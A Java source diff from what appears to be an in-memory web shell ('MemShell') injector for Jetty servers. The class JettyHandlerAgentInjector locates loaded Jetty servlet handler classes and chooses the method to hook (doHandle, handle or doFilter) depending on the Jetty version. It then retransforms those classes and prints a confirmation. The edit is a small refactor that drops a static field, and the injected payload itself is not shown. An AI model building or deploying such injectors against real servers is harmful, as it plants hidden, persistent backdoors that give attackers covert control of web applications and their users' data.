@@ -23,7 +23,6 @@ public class JettyHandlerAgentInjector implements ClassFileTransformer {
             "org/eclipse/jetty/ee10/servlet/ServletHandler$Chain",
             "org/mortbay/jetty/servlet/ServletHandler"
     );
-    private static String targetClassName = "";
     private static String targetMethodName = "doHandle";
 
     public static String getClassName() {
@@ -49,15 +48,14 @@ public class JettyHandlerAgentInjector implements ClassFileTransformer {
             String name = allLoadedClass.getName();
             for (String targetClass : TARGET_CLASSES) {
                 if (targetClass.replace("/", ".").equals(name)) {
-                    targetClassName = name;
-                    if (targetClassName.contains("mortbay")) {
+                    if (name.contains("mortbay")) {
                         targetMethodName = "handle";
                     }
-                    if (targetClassName.contains("ee10")) {
+                    if (name.contains("ee10")) {
                         targetMethodName = "doFilter";
                     }
                     inst.retransformClasses(allLoadedClass);
-                    System.out.println("MemShell Agent is working at " + targetClassName + "." + targetMethodName);
+                    System.out.println("MemShell Agent is working at " + name + "." + targetMethodName);
                 }
             }
         }
